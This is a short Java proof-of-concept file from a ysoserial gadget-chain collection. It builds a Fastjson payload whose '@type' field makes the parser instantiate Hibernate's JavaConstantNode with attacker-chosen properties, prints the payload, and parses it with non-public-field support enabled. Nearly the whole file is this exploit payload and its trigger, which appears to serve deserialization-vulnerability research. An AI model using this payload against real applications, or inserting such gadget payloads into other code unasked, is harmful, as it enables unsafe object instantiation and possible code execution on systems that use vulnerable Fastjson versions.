package ysoserial.payloads.tabbyGadgetChains.hibernate4;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.util.Properties;

public class Poc4 {
    public static void main(String[] args) {
        Properties properties = new Properties();
        properties.put("enumClass","className");
//        String poc = JSON.toJSONString(properties, SerializerFeature.WriteClassName);

        String poc = "{\"@type\":\"org.hibernate.hql.internal.ast.tree.JavaConstantNode\",\"Text\":{\"@type\":\"java.util.Properties\",\"enumClass\":\"Test.class\"}}";

        System.out.println(poc);
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
